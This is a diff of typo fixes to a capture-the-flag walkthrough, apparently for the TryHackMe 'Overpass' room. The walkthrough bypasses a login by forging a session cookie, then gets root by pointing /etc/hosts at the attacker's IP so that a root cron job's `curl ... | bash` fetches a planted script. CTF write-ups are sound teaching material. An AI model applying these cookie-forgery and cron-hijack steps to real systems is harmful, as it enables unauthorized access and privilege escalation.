@@ -70,7 +70,7 @@ especially these last few lines:
 so, when we try to log in with wrong credentials,the response we get is `"Incorrect credentials"`, so nothing happens  
 but if we get the right credentials, it sets the `SessionToken` cookie to the value `statusOrCookie` and points us to `/admin`  
 
-What is we try to manually set the cookie to some status value?  
+What if we try to manually set the cookie to some status value?  
 ```js
 Cookies.set("SessionToken",400)
 ```
@@ -148,7 +148,7 @@ func rot47(input string) string {
 So it seems they use `ROT47`, we use [CyberChef](https://gchq.github.io/CyberChef/) to decrypt it  
 ![](14.png)
 * * *
-Moving on, we try to find the automate build script, so we look in `/etc` for cron jobs and we find one: 
+Moving on, we try to find the automatic build script, so we look in `/etc` for cron jobs and we find one: 
 
 ![](15.png)
 
@@ -171,16 +171,16 @@ Let's check the `/etc/hosts` file
 
 ![](16.png)
 
-Nice! It seems that we have write permission  
+Nice! It seems that we have write permissions  
 Let's change the ip of `overpass.thm` to our VPN ip
 (you can find it using `ip a`, or from the acces page on tryhackme)  
 
-We open `/etc/hosts` using **vim** and we write out ip address
+We open `/etc/hosts` using **vim** and we write our ip address
 ![](17.png)
 
 * * *
 
-Alright, since the cron job requests from `curl overpass.thm/downloads/src/buildscript.sh | bash` we have to make directory and write our build script with the following content:
+Alright, since the cron job requests from `curl overpass.thm/downloads/src/buildscript.sh | bash` we have to make a directory and write our build script with the following content:
 ```bash
 cat /root/root.txt > /home/james/stuff.txt
 ```
